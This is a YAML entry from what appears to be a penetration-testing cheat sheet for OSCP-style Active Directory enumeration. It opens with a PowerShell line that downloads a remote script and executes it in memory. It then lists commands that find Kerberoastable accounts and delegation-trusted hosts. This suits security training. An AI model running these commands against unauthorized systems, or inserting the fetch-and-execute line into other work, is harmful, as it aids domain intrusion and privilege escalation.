---
variants:
  - label: load
    command: |
      iex (new-object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1')
      Import-ActiveDirectory
  - label: initial-enum
    command: |
      Get-ADDomain
      Get-ADForest
      Get-ADTrust -Filter *
      Get-ADDomainController -Filter *
      Get-ADUser -Filter * -Properties * | Select-Object SamAccountName,Enabled,LastLogonDate
  - label: kerberoast
    command: |
      Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
        Select-Object SamAccountName,ServicePrincipalName
  - label: delegation-enum
    command: |
      Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation,ServicePrincipalName
      Get-ADUser -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation
      Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
description: Enumerate AD with the in-memory PowerShell AD module, by task.
os: [Windows]
category: [oscp]
service: [LDAP, Kerberos]
phase: [Enumeration, PrivEsc]
references:
  - https://github.com/samratashok/ADModule
---
